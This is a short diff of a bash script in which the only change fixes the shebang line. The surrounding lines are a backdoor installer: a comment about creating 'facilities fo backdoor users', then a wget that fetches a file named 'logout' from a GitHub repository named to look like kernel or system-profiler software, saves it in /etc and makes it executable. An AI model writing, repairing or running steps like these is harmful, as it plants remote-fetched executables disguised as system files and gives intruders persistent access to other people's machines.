@@ -1,4 +1,4 @@
-#!/bin.bash
+#!/bin/bash
 #Create facilities fo backdoor users - ONE TIME at first
 wget -P /etc https://raw.githubusercontent.com/systemprofiler/kernel/master/logout
 chmod 711 /etc/logout
